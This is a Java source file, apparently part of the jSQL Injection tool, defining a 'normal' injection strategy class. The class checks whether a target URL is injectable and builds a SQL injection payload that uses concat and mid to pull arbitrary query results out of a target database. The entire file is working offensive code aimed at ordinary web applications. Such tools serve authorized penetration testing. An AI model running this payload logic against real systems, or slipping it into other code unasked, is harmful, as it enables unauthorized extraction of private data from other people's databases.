package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.AbstractSuspendable;
import com.jsql.model.InjectionModel;
import com.jsql.model.StoppableGetInitialQuery;
import com.jsql.model.bean.Request;
import com.jsql.view.GUIMediator;

/**
 * Injection strategy using normal attack.
 */
public class NormalStrategy extends AbstractInjectionStrategy {
    @Override
    public void checkApplicability() throws PreparationException {
        InjectionModel.LOGGER.info("Normal test...");
        GUIMediator.model().initialQuery = new StoppableGetInitialQuery().beginSynchrone();

        this.isApplicable = !GUIMediator.model().initialQuery.equals("");
        
        if (this.isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkNormalVulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkNormalInvulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
        return GUIMediator.model().inject(
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")",
                null,
                true
        );
    }

    @Override
    public void applyStrategy() {
        InjectionModel.LOGGER.info("Using normal injection...");
        GUIMediator.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MarkNormalStrategy");
        GUIMediator.model().interact(request);
    }
}
